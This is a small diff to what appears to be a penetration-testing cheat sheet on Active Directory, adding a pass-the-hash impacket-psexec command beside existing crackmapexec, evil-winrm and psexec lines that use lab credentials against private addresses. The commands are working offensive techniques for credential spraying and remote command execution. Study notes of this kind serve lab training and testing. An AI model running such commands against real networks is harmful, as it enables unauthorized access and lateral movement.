@@ -8,6 +8,7 @@ crackmapexec smb 192.168.183.137 -u "Frank Castle" -p Password1
 crackmapexec smb 192.168.183.0/24 -u fcastle -d MARVEL.local -p Password1
 evil-winrm -i '10.10.11.129' -u 'Sam.Davies' -p 'Password123'
 impacket-psexec domain.local/administrator:MyPasswowrd123@10.10.10.100
+impacket-psexec domain.local/administrator@10.10.10.100 -H <hash>
 ```
 
 ## with Machine$ Accounts
